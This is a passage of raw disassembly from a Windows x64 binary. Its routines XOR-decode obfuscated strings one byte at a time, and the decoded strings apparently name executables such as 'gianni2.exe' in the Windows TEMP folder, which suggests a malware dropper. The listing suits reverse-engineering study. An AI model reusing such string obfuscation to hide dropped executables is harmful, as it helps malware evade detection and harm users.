   140001da3:	b8 14 00 00 00       	mov    $0x14,%eax
   140001da8:	4c 0f 47 05 d8 50 02 	cmova  0x250d8(%rip),%r8        # 0x140026e88
   140001daf:	00 
   140001db0:	33 d2                	xor    %edx,%edx
   140001db2:	48 f7 f1             	div    %rcx
   140001db5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001dba:	34 6e                	xor    $0x6e,%al
   140001dbc:	41 88 40 14          	mov    %al,0x14(%r8)
   140001dc0:	4c 8b c3             	mov    %rbx,%r8
   140001dc3:	48 83 3d d5 50 02 00 	cmpq   $0xf,0x250d5(%rip)        # 0x140026ea0
   140001dca:	0f 
   140001dcb:	b8 15 00 00 00       	mov    $0x15,%eax
   140001dd0:	4c 0f 47 05 b0 50 02 	cmova  0x250b0(%rip),%r8        # 0x140026e88
   140001dd7:	00 
   140001dd8:	33 d2                	xor    %edx,%edx
   140001dda:	48 f7 f1             	div    %rcx
   140001ddd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001de2:	34 69                	xor    $0x69,%al
   140001de4:	41 88 40 15          	mov    %al,0x15(%r8)
   140001de8:	4c 8b c3             	mov    %rbx,%r8
   140001deb:	48 83 3d ad 50 02 00 	cmpq   $0xf,0x250ad(%rip)        # 0x140026ea0
   140001df2:	0f 
   140001df3:	b8 16 00 00 00       	mov    $0x16,%eax
   140001df8:	4c 0f 47 05 88 50 02 	cmova  0x25088(%rip),%r8        # 0x140026e88
   140001dff:	00 
   140001e00:	33 d2                	xor    %edx,%edx
   140001e02:	48 f7 f1             	div    %rcx
   140001e05:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001e0a:	34 31                	xor    $0x31,%al
   140001e0c:	41 88 40 16          	mov    %al,0x16(%r8)
   140001e10:	4c 8b c3             	mov    %rbx,%r8
   140001e13:	48 83 3d 85 50 02 00 	cmpq   $0xf,0x25085(%rip)        # 0x140026ea0
   140001e1a:	0f 
   140001e1b:	b8 17 00 00 00       	mov    $0x17,%eax
   140001e20:	4c 0f 47 05 60 50 02 	cmova  0x25060(%rip),%r8        # 0x140026e88
   140001e27:	00 
   140001e28:	33 d2                	xor    %edx,%edx
   140001e2a:	48 f7 f1             	div    %rcx
   140001e2d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001e32:	34 2e                	xor    $0x2e,%al
   140001e34:	41 88 40 17          	mov    %al,0x17(%r8)
   140001e38:	4c 8b c3             	mov    %rbx,%r8
   140001e3b:	48 83 3d 5d 50 02 00 	cmpq   $0xf,0x2505d(%rip)        # 0x140026ea0
   140001e42:	0f 
   140001e43:	b8 18 00 00 00       	mov    $0x18,%eax
   140001e48:	4c 0f 47 05 38 50 02 	cmova  0x25038(%rip),%r8        # 0x140026e88
   140001e4f:	00 
   140001e50:	33 d2                	xor    %edx,%edx
   140001e52:	48 f7 f1             	div    %rcx
   140001e55:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001e5a:	34 65                	xor    $0x65,%al
   140001e5c:	41 88 40 18          	mov    %al,0x18(%r8)
   140001e60:	4c 8b c3             	mov    %rbx,%r8
   140001e63:	48 83 3d 35 50 02 00 	cmpq   $0xf,0x25035(%rip)        # 0x140026ea0
   140001e6a:	0f 
   140001e6b:	b8 19 00 00 00       	mov    $0x19,%eax
   140001e70:	4c 0f 47 05 10 50 02 	cmova  0x25010(%rip),%r8        # 0x140026e88
   140001e77:	00 
   140001e78:	33 d2                	xor    %edx,%edx
   140001e7a:	48 f7 f1             	div    %rcx
   140001e7d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001e82:	34 78                	xor    $0x78,%al
   140001e84:	41 88 40 19          	mov    %al,0x19(%r8)
   140001e88:	4c 8b c3             	mov    %rbx,%r8
   140001e8b:	48 83 3d 0d 50 02 00 	cmpq   $0xf,0x2500d(%rip)        # 0x140026ea0
   140001e92:	0f 
   140001e93:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140001e98:	4c 0f 47 05 e8 4f 02 	cmova  0x24fe8(%rip),%r8        # 0x140026e88
   140001e9f:	00 
   140001ea0:	33 d2                	xor    %edx,%edx
   140001ea2:	48 f7 f1             	div    %rcx
   140001ea5:	48 8b c3             	mov    %rbx,%rax
   140001ea8:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   140001ead:	80 f1 65             	xor    $0x65,%cl
   140001eb0:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140001eb4:	48 83 c4 30          	add    $0x30,%rsp
   140001eb8:	5b                   	pop    %rbx
   140001eb9:	c3                   	ret
   140001eba:	cc                   	int3
   140001ebb:	cc                   	int3
   140001ebc:	cc                   	int3
   140001ebd:	cc                   	int3
   140001ebe:	cc                   	int3
   140001ebf:	cc                   	int3
   140001ec0:	40 53                	rex push %rbx
   140001ec2:	48 83 ec 30          	sub    $0x30,%rsp
   140001ec6:	48 8d 1d 9b 50 02 00 	lea    0x2509b(%rip),%rbx        # 0x140026f68
   140001ecd:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140001ed2:	48 8b cb             	mov    %rbx,%rcx
   140001ed5:	e8 36 44 00 00       	call   0x140006310
   140001eda:	4c 8d 0d e7 c9 00 00 	lea    0xc9e7(%rip),%r9        # 0x14000e8c8
   140001ee1:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140001ee8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140001eef:	00 
   140001ef0:	48 ff c1             	inc    %rcx
   140001ef3:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140001ef8:	75 f6                	jne    0x140001ef0
   140001efa:	48 83 3d 7e 50 02 00 	cmpq   $0xf,0x2507e(%rip)        # 0x140026f80
   140001f01:	0f 
   140001f02:	48 8b c3             	mov    %rbx,%rax
   140001f05:	4c 8b c3             	mov    %rbx,%r8
   140001f08:	48 0f 47 05 58 50 02 	cmova  0x25058(%rip),%rax        # 0x140026f68
   140001f0f:	00 
   140001f10:	c6 00 25             	movb   $0x25,(%rax)
   140001f13:	b8 01 00 00 00       	mov    $0x1,%eax
   140001f18:	48 83 3d 60 50 02 00 	cmpq   $0xf,0x25060(%rip)        # 0x140026f80
   140001f1f:	0f 
   140001f20:	4c 0f 47 05 40 50 02 	cmova  0x25040(%rip),%r8        # 0x140026f68
   140001f27:	00 
   140001f28:	33 d2                	xor    %edx,%edx
   140001f2a:	48 f7 f1             	div    %rcx
   140001f2d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001f32:	34 3a                	xor    $0x3a,%al
   140001f34:	41 88 40 01          	mov    %al,0x1(%r8)
   140001f38:	4c 8b c3             	mov    %rbx,%r8
   140001f3b:	48 83 3d 3d 50 02 00 	cmpq   $0xf,0x2503d(%rip)        # 0x140026f80
   140001f42:	0f 
   140001f43:	b8 02 00 00 00       	mov    $0x2,%eax
   140001f48:	4c 0f 47 05 18 50 02 	cmova  0x25018(%rip),%r8        # 0x140026f68
   140001f4f:	00 
   140001f50:	33 d2                	xor    %edx,%edx
   140001f52:	48 f7 f1             	div    %rcx
   140001f55:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001f5a:	34 5c                	xor    $0x5c,%al
   140001f5c:	41 88 40 02          	mov    %al,0x2(%r8)
   140001f60:	4c 8b c3             	mov    %rbx,%r8
   140001f63:	48 83 3d 15 50 02 00 	cmpq   $0xf,0x25015(%rip)        # 0x140026f80
   140001f6a:	0f 
   140001f6b:	b8 03 00 00 00       	mov    $0x3,%eax
   140001f70:	4c 0f 47 05 f0 4f 02 	cmova  0x24ff0(%rip),%r8        # 0x140026f68
   140001f77:	00 
   140001f78:	33 d2                	xor    %edx,%edx
   140001f7a:	48 f7 f1             	div    %rcx
   140001f7d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001f82:	34 57                	xor    $0x57,%al
   140001f84:	41 88 40 03          	mov    %al,0x3(%r8)
   140001f88:	4c 8b c3             	mov    %rbx,%r8
   140001f8b:	48 83 3d ed 4f 02 00 	cmpq   $0xf,0x24fed(%rip)        # 0x140026f80
   140001f92:	0f 
   140001f93:	b8 04 00 00 00       	mov    $0x4,%eax
   140001f98:	4c 0f 47 05 c8 4f 02 	cmova  0x24fc8(%rip),%r8        # 0x140026f68
   140001f9f:	00 
   140001fa0:	33 d2                	xor    %edx,%edx
   140001fa2:	48 f7 f1             	div    %rcx
   140001fa5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001faa:	34 69                	xor    $0x69,%al
   140001fac:	41 88 40 04          	mov    %al,0x4(%r8)
   140001fb0:	4c 8b c3             	mov    %rbx,%r8
   140001fb3:	48 83 3d c5 4f 02 00 	cmpq   $0xf,0x24fc5(%rip)        # 0x140026f80
   140001fba:	0f 
   140001fbb:	b8 05 00 00 00       	mov    $0x5,%eax
   140001fc0:	4c 0f 47 05 a0 4f 02 	cmova  0x24fa0(%rip),%r8        # 0x140026f68
   140001fc7:	00 
   140001fc8:	33 d2                	xor    %edx,%edx
   140001fca:	48 f7 f1             	div    %rcx
   140001fcd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001fd2:	34 6e                	xor    $0x6e,%al
   140001fd4:	41 88 40 05          	mov    %al,0x5(%r8)
   140001fd8:	4c 8b c3             	mov    %rbx,%r8
   140001fdb:	48 83 3d 9d 4f 02 00 	cmpq   $0xf,0x24f9d(%rip)        # 0x140026f80
   140001fe2:	0f 
   140001fe3:	b8 06 00 00 00       	mov    $0x6,%eax
   140001fe8:	4c 0f 47 05 78 4f 02 	cmova  0x24f78(%rip),%r8        # 0x140026f68
   140001fef:	00 
   140001ff0:	33 d2                	xor    %edx,%edx
   140001ff2:	48 f7 f1             	div    %rcx
   140001ff5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001ffa:	34 64                	xor    $0x64,%al
   140001ffc:	41 88 40 06          	mov    %al,0x6(%r8)
   140002000:	4c 8b c3             	mov    %rbx,%r8
   140002003:	48 83 3d 75 4f 02 00 	cmpq   $0xf,0x24f75(%rip)        # 0x140026f80
   14000200a:	0f 
   14000200b:	b8 07 00 00 00       	mov    $0x7,%eax
   140002010:	4c 0f 47 05 50 4f 02 	cmova  0x24f50(%rip),%r8        # 0x140026f68
   140002017:	00 
   140002018:	33 d2                	xor    %edx,%edx
   14000201a:	48 f7 f1             	div    %rcx
   14000201d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002022:	34 6f                	xor    $0x6f,%al
   140002024:	41 88 40 07          	mov    %al,0x7(%r8)
   140002028:	4c 8b c3             	mov    %rbx,%r8
   14000202b:	48 83 3d 4d 4f 02 00 	cmpq   $0xf,0x24f4d(%rip)        # 0x140026f80
   140002032:	0f 
   140002033:	b8 08 00 00 00       	mov    $0x8,%eax
   140002038:	4c 0f 47 05 28 4f 02 	cmova  0x24f28(%rip),%r8        # 0x140026f68
   14000203f:	00 
   140002040:	33 d2                	xor    %edx,%edx
   140002042:	48 f7 f1             	div    %rcx
   140002045:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000204a:	34 77                	xor    $0x77,%al
   14000204c:	41 88 40 08          	mov    %al,0x8(%r8)
   140002050:	4c 8b c3             	mov    %rbx,%r8
   140002053:	48 83 3d 25 4f 02 00 	cmpq   $0xf,0x24f25(%rip)        # 0x140026f80
   14000205a:	0f 
   14000205b:	b8 09 00 00 00       	mov    $0x9,%eax
   140002060:	4c 0f 47 05 00 4f 02 	cmova  0x24f00(%rip),%r8        # 0x140026f68
   140002067:	00 
   140002068:	33 d2                	xor    %edx,%edx
   14000206a:	48 f7 f1             	div    %rcx
   14000206d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002072:	34 73                	xor    $0x73,%al
   140002074:	41 88 40 09          	mov    %al,0x9(%r8)
   140002078:	4c 8b c3             	mov    %rbx,%r8
   14000207b:	48 83 3d fd 4e 02 00 	cmpq   $0xf,0x24efd(%rip)        # 0x140026f80
   140002082:	0f 
   140002083:	b8 0a 00 00 00       	mov    $0xa,%eax
   140002088:	4c 0f 47 05 d8 4e 02 	cmova  0x24ed8(%rip),%r8        # 0x140026f68
   14000208f:	00 
   140002090:	33 d2                	xor    %edx,%edx
   140002092:	48 f7 f1             	div    %rcx
   140002095:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000209a:	34 5c                	xor    $0x5c,%al
   14000209c:	41 88 40 0a          	mov    %al,0xa(%r8)
   1400020a0:	4c 8b c3             	mov    %rbx,%r8
   1400020a3:	48 83 3d d5 4e 02 00 	cmpq   $0xf,0x24ed5(%rip)        # 0x140026f80
   1400020aa:	0f 
   1400020ab:	b8 0b 00 00 00       	mov    $0xb,%eax
   1400020b0:	4c 0f 47 05 b0 4e 02 	cmova  0x24eb0(%rip),%r8        # 0x140026f68
   1400020b7:	00 
   1400020b8:	33 d2                	xor    %edx,%edx
   1400020ba:	48 f7 f1             	div    %rcx
   1400020bd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400020c2:	34 54                	xor    $0x54,%al
   1400020c4:	41 88 40 0b          	mov    %al,0xb(%r8)
   1400020c8:	4c 8b c3             	mov    %rbx,%r8
   1400020cb:	48 83 3d ad 4e 02 00 	cmpq   $0xf,0x24ead(%rip)        # 0x140026f80
   1400020d2:	0f 
   1400020d3:	b8 0c 00 00 00       	mov    $0xc,%eax
   1400020d8:	4c 0f 47 05 88 4e 02 	cmova  0x24e88(%rip),%r8        # 0x140026f68
   1400020df:	00 
   1400020e0:	33 d2                	xor    %edx,%edx
   1400020e2:	48 f7 f1             	div    %rcx
   1400020e5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400020ea:	34 45                	xor    $0x45,%al
   1400020ec:	41 88 40 0c          	mov    %al,0xc(%r8)
   1400020f0:	4c 8b c3             	mov    %rbx,%r8
   1400020f3:	48 83 3d 85 4e 02 00 	cmpq   $0xf,0x24e85(%rip)        # 0x140026f80
   1400020fa:	0f 
   1400020fb:	b8 0d 00 00 00       	mov    $0xd,%eax
   140002100:	4c 0f 47 05 60 4e 02 	cmova  0x24e60(%rip),%r8        # 0x140026f68
   140002107:	00 
   140002108:	33 d2                	xor    %edx,%edx
   14000210a:	48 f7 f1             	div    %rcx
   14000210d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002112:	34 4d                	xor    $0x4d,%al
   140002114:	41 88 40 0d          	mov    %al,0xd(%r8)
   140002118:	4c 8b c3             	mov    %rbx,%r8
   14000211b:	48 83 3d 5d 4e 02 00 	cmpq   $0xf,0x24e5d(%rip)        # 0x140026f80
   140002122:	0f 
   140002123:	b8 0e 00 00 00       	mov    $0xe,%eax
   140002128:	4c 0f 47 05 38 4e 02 	cmova  0x24e38(%rip),%r8        # 0x140026f68
   14000212f:	00 
   140002130:	33 d2                	xor    %edx,%edx
   140002132:	48 f7 f1             	div    %rcx
   140002135:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000213a:	34 50                	xor    $0x50,%al
   14000213c:	41 88 40 0e          	mov    %al,0xe(%r8)
   140002140:	4c 8b c3             	mov    %rbx,%r8
   140002143:	48 83 3d 35 4e 02 00 	cmpq   $0xf,0x24e35(%rip)        # 0x140026f80
   14000214a:	0f 
   14000214b:	b8 0f 00 00 00       	mov    $0xf,%eax
   140002150:	4c 0f 47 05 10 4e 02 	cmova  0x24e10(%rip),%r8        # 0x140026f68
   140002157:	00 
   140002158:	33 d2                	xor    %edx,%edx
   14000215a:	48 f7 f1             	div    %rcx
   14000215d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002162:	34 5c                	xor    $0x5c,%al
   140002164:	41 88 40 0f          	mov    %al,0xf(%r8)
   140002168:	4c 8b c3             	mov    %rbx,%r8
   14000216b:	48 83 3d 0d 4e 02 00 	cmpq   $0xf,0x24e0d(%rip)        # 0x140026f80
   140002172:	0f 
   140002173:	b8 10 00 00 00       	mov    $0x10,%eax
   140002178:	4c 0f 47 05 e8 4d 02 	cmova  0x24de8(%rip),%r8        # 0x140026f68
   14000217f:	00 
   140002180:	33 d2                	xor    %edx,%edx
   140002182:	48 f7 f1             	div    %rcx
   140002185:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000218a:	34 67                	xor    $0x67,%al
   14000218c:	41 88 40 10          	mov    %al,0x10(%r8)
   140002190:	4c 8b c3             	mov    %rbx,%r8
   140002193:	48 83 3d e5 4d 02 00 	cmpq   $0xf,0x24de5(%rip)        # 0x140026f80
   14000219a:	0f 
   14000219b:	b8 11 00 00 00       	mov    $0x11,%eax
   1400021a0:	4c 0f 47 05 c0 4d 02 	cmova  0x24dc0(%rip),%r8        # 0x140026f68
   1400021a7:	00 
   1400021a8:	33 d2                	xor    %edx,%edx
   1400021aa:	48 f7 f1             	div    %rcx
   1400021ad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400021b2:	34 69                	xor    $0x69,%al
   1400021b4:	41 88 40 11          	mov    %al,0x11(%r8)
   1400021b8:	4c 8b c3             	mov    %rbx,%r8
   1400021bb:	48 83 3d bd 4d 02 00 	cmpq   $0xf,0x24dbd(%rip)        # 0x140026f80
   1400021c2:	0f 
   1400021c3:	b8 12 00 00 00       	mov    $0x12,%eax
   1400021c8:	4c 0f 47 05 98 4d 02 	cmova  0x24d98(%rip),%r8        # 0x140026f68
   1400021cf:	00 
   1400021d0:	33 d2                	xor    %edx,%edx
   1400021d2:	48 f7 f1             	div    %rcx
   1400021d5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400021da:	34 61                	xor    $0x61,%al
   1400021dc:	41 88 40 12          	mov    %al,0x12(%r8)
   1400021e0:	4c 8b c3             	mov    %rbx,%r8
   1400021e3:	48 83 3d 95 4d 02 00 	cmpq   $0xf,0x24d95(%rip)        # 0x140026f80
   1400021ea:	0f 
   1400021eb:	b8 13 00 00 00       	mov    $0x13,%eax
   1400021f0:	4c 0f 47 05 70 4d 02 	cmova  0x24d70(%rip),%r8        # 0x140026f68
   1400021f7:	00 
   1400021f8:	33 d2                	xor    %edx,%edx
   1400021fa:	48 f7 f1             	div    %rcx
   1400021fd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002202:	34 6e                	xor    $0x6e,%al
   140002204:	41 88 40 13          	mov    %al,0x13(%r8)
   140002208:	4c 8b c3             	mov    %rbx,%r8
   14000220b:	48 83 3d 6d 4d 02 00 	cmpq   $0xf,0x24d6d(%rip)        # 0x140026f80
   140002212:	0f 
   140002213:	b8 14 00 00 00       	mov    $0x14,%eax
   140002218:	4c 0f 47 05 48 4d 02 	cmova  0x24d48(%rip),%r8        # 0x140026f68
   14000221f:	00 
   140002220:	33 d2                	xor    %edx,%edx
   140002222:	48 f7 f1             	div    %rcx
   140002225:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000222a:	34 6e                	xor    $0x6e,%al
   14000222c:	41 88 40 14          	mov    %al,0x14(%r8)
   140002230:	4c 8b c3             	mov    %rbx,%r8
   140002233:	48 83 3d 45 4d 02 00 	cmpq   $0xf,0x24d45(%rip)        # 0x140026f80
   14000223a:	0f 
   14000223b:	b8 15 00 00 00       	mov    $0x15,%eax
   140002240:	4c 0f 47 05 20 4d 02 	cmova  0x24d20(%rip),%r8        # 0x140026f68
   140002247:	00 
   140002248:	33 d2                	xor    %edx,%edx
   14000224a:	48 f7 f1             	div    %rcx
   14000224d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002252:	34 69                	xor    $0x69,%al
   140002254:	41 88 40 15          	mov    %al,0x15(%r8)
   140002258:	4c 8b c3             	mov    %rbx,%r8
   14000225b:	48 83 3d 1d 4d 02 00 	cmpq   $0xf,0x24d1d(%rip)        # 0x140026f80
   140002262:	0f 
   140002263:	b8 16 00 00 00       	mov    $0x16,%eax
   140002268:	4c 0f 47 05 f8 4c 02 	cmova  0x24cf8(%rip),%r8        # 0x140026f68
   14000226f:	00 
   140002270:	33 d2                	xor    %edx,%edx
   140002272:	48 f7 f1             	div    %rcx
   140002275:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000227a:	34 32                	xor    $0x32,%al
   14000227c:	41 88 40 16          	mov    %al,0x16(%r8)
   140002280:	4c 8b c3             	mov    %rbx,%r8
   140002283:	48 83 3d f5 4c 02 00 	cmpq   $0xf,0x24cf5(%rip)        # 0x140026f80
   14000228a:	0f 
   14000228b:	b8 17 00 00 00       	mov    $0x17,%eax
   140002290:	4c 0f 47 05 d0 4c 02 	cmova  0x24cd0(%rip),%r8        # 0x140026f68
   140002297:	00 
   140002298:	33 d2                	xor    %edx,%edx
   14000229a:	48 f7 f1             	div    %rcx
   14000229d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400022a2:	34 2e                	xor    $0x2e,%al
   1400022a4:	41 88 40 17          	mov    %al,0x17(%r8)
   1400022a8:	4c 8b c3             	mov    %rbx,%r8
   1400022ab:	48 83 3d cd 4c 02 00 	cmpq   $0xf,0x24ccd(%rip)        # 0x140026f80
   1400022b2:	0f 
   1400022b3:	b8 18 00 00 00       	mov    $0x18,%eax
   1400022b8:	4c 0f 47 05 a8 4c 02 	cmova  0x24ca8(%rip),%r8        # 0x140026f68
   1400022bf:	00 
   1400022c0:	33 d2                	xor    %edx,%edx
   1400022c2:	48 f7 f1             	div    %rcx
   1400022c5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400022ca:	34 65                	xor    $0x65,%al
   1400022cc:	41 88 40 18          	mov    %al,0x18(%r8)
   1400022d0:	4c 8b c3             	mov    %rbx,%r8
   1400022d3:	48 83 3d a5 4c 02 00 	cmpq   $0xf,0x24ca5(%rip)        # 0x140026f80
   1400022da:	0f 
   1400022db:	b8 19 00 00 00       	mov    $0x19,%eax
   1400022e0:	4c 0f 47 05 80 4c 02 	cmova  0x24c80(%rip),%r8        # 0x140026f68
   1400022e7:	00 
   1400022e8:	33 d2                	xor    %edx,%edx
   1400022ea:	48 f7 f1             	div    %rcx
   1400022ed:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400022f2:	34 78                	xor    $0x78,%al
   1400022f4:	41 88 40 19          	mov    %al,0x19(%r8)
   1400022f8:	4c 8b c3             	mov    %rbx,%r8
   1400022fb:	48 83 3d 7d 4c 02 00 	cmpq   $0xf,0x24c7d(%rip)        # 0x140026f80
   140002302:	0f 
   140002303:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140002308:	4c 0f 47 05 58 4c 02 	cmova  0x24c58(%rip),%r8        # 0x140026f68
   14000230f:	00 
   140002310:	33 d2                	xor    %edx,%edx
   140002312:	48 f7 f1             	div    %rcx
   140002315:	48 8b c3             	mov    %rbx,%rax
   140002318:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   14000231d:	80 f1 65             	xor    $0x65,%cl
   140002320:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140002324:	48 83 c4 30          	add    $0x30,%rsp
   140002328:	5b                   	pop    %rbx
   140002329:	c3                   	ret
   14000232a:	cc                   	int3
   14000232b:	cc                   	int3
   14000232c:	cc                   	int3
   14000232d:	cc                   	int3
   14000232e:	cc                   	int3
   14000232f:	cc                   	int3
   140002330:	40 53                	rex push %rbx
   140002332:	48 83 ec 30          	sub    $0x30,%rsp
   140002336:	48 8d 1d 8b 4b 02 00 	lea    0x24b8b(%rip),%rbx        # 0x140026ec8
   14000233d:	ba 1b 00 00 00       	mov    $0x1b,%edx
   140002342:	48 8b cb             	mov    %rbx,%rcx
   140002345:	e8 c6 3f 00 00       	call   0x140006310
   14000234a:	4c 8d 0d 6f c5 00 00 	lea    0xc56f(%rip),%r9        # 0x14000e8c0
   140002351:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002358:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000235f:	00 
   140002360:	48 ff c1             	inc    %rcx
   140002363:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140002368:	75 f6                	jne    0x140002360
   14000236a:	48 83 3d 6e 4b 02 00 	cmpq   $0xf,0x24b6e(%rip)        # 0x140026ee0
   140002371:	0f 
   140002372:	48 8b c3             	mov    %rbx,%rax
   140002375:	4c 8b c3             	mov    %rbx,%r8
   140002378:	48 0f 47 05 48 4b 02 	cmova  0x24b48(%rip),%rax        # 0x140026ec8
   14000237f:	00 
   140002380:	c6 00 2c             	movb   $0x2c,(%rax)
   140002383:	b8 01 00 00 00       	mov    $0x1,%eax
   140002388:	48 83 3d 50 4b 02 00 	cmpq   $0xf,0x24b50(%rip)        # 0x140026ee0
   14000238f:	0f 
   140002390:	4c 0f 47 05 30 4b 02 	cmova  0x24b30(%rip),%r8        # 0x140026ec8
   140002397:	00 
   140002398:	33 d2                	xor    %edx,%edx
   14000239a:	48 f7 f1             	div    %rcx
   14000239d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400023a2:	34 3a                	xor    $0x3a,%al
   1400023a4:	41 88 40 01          	mov    %al,0x1(%r8)
   1400023a8:	4c 8b c3             	mov    %rbx,%r8
   1400023ab:	48 83 3d 2d 4b 02 00 	cmpq   $0xf,0x24b2d(%rip)        # 0x140026ee0
   1400023b2:	0f 
   1400023b3:	b8 02 00 00 00       	mov    $0x2,%eax
   1400023b8:	4c 0f 47 05 08 4b 02 	cmova  0x24b08(%rip),%r8        # 0x140026ec8
   1400023bf:	00 
   1400023c0:	33 d2                	xor    %edx,%edx
   1400023c2:	48 f7 f1             	div    %rcx
   1400023c5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400023ca:	34 5c                	xor    $0x5c,%al
   1400023cc:	41 88 40 02          	mov    %al,0x2(%r8)
   1400023d0:	4c 8b c3             	mov    %rbx,%r8
   1400023d3:	48 83 3d 05 4b 02 00 	cmpq   $0xf,0x24b05(%rip)        # 0x140026ee0
   1400023da:	0f 
   1400023db:	b8 03 00 00 00       	mov    $0x3,%eax
   1400023e0:	4c 0f 47 05 e0 4a 02 	cmova  0x24ae0(%rip),%r8        # 0x140026ec8
   1400023e7:	00 
   1400023e8:	33 d2                	xor    %edx,%edx
   1400023ea:	48 f7 f1             	div    %rcx
   1400023ed:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400023f2:	34 57                	xor    $0x57,%al
   1400023f4:	41 88 40 03          	mov    %al,0x3(%r8)
   1400023f8:	4c 8b c3             	mov    %rbx,%r8
   1400023fb:	48 83 3d dd 4a 02 00 	cmpq   $0xf,0x24add(%rip)        # 0x140026ee0
   140002402:	0f 
   140002403:	b8 04 00 00 00       	mov    $0x4,%eax
   140002408:	4c 0f 47 05 b8 4a 02 	cmova  0x24ab8(%rip),%r8        # 0x140026ec8
   14000240f:	00 
   140002410:	33 d2                	xor    %edx,%edx
   140002412:	48 f7 f1             	div    %rcx
   140002415:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000241a:	34 69                	xor    $0x69,%al
   14000241c:	41 88 40 04          	mov    %al,0x4(%r8)
   140002420:	4c 8b c3             	mov    %rbx,%r8
   140002423:	48 83 3d b5 4a 02 00 	cmpq   $0xf,0x24ab5(%rip)        # 0x140026ee0
   14000242a:	0f 
   14000242b:	b8 05 00 00 00       	mov    $0x5,%eax
   140002430:	4c 0f 47 05 90 4a 02 	cmova  0x24a90(%rip),%r8        # 0x140026ec8
   140002437:	00 
   140002438:	33 d2                	xor    %edx,%edx
   14000243a:	48 f7 f1             	div    %rcx
   14000243d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002442:	34 6e                	xor    $0x6e,%al
   140002444:	41 88 40 05          	mov    %al,0x5(%r8)
   140002448:	4c 8b c3             	mov    %rbx,%r8
   14000244b:	48 83 3d 8d 4a 02 00 	cmpq   $0xf,0x24a8d(%rip)        # 0x140026ee0
   140002452:	0f 
   140002453:	b8 06 00 00 00       	mov    $0x6,%eax
   140002458:	4c 0f 47 05 68 4a 02 	cmova  0x24a68(%rip),%r8        # 0x140026ec8
   14000245f:	00 
   140002460:	33 d2                	xor    %edx,%edx
   140002462:	48 f7 f1             	div    %rcx
   140002465:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000246a:	34 64                	xor    $0x64,%al
   14000246c:	41 88 40 06          	mov    %al,0x6(%r8)
   140002470:	4c 8b c3             	mov    %rbx,%r8
   140002473:	48 83 3d 65 4a 02 00 	cmpq   $0xf,0x24a65(%rip)        # 0x140026ee0
   14000247a:	0f 
   14000247b:	b8 07 00 00 00       	mov    $0x7,%eax
   140002480:	4c 0f 47 05 40 4a 02 	cmova  0x24a40(%rip),%r8        # 0x140026ec8
   140002487:	00 
   140002488:	33 d2                	xor    %edx,%edx
   14000248a:	48 f7 f1             	div    %rcx
   14000248d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002492:	34 6f                	xor    $0x6f,%al
   140002494:	41 88 40 07          	mov    %al,0x7(%r8)
   140002498:	4c 8b c3             	mov    %rbx,%r8
   14000249b:	48 83 3d 3d 4a 02 00 	cmpq   $0xf,0x24a3d(%rip)        # 0x140026ee0
   1400024a2:	0f 
   1400024a3:	b8 08 00 00 00       	mov    $0x8,%eax
   1400024a8:	4c 0f 47 05 18 4a 02 	cmova  0x24a18(%rip),%r8        # 0x140026ec8
   1400024af:	00 
   1400024b0:	33 d2                	xor    %edx,%edx
   1400024b2:	48 f7 f1             	div    %rcx
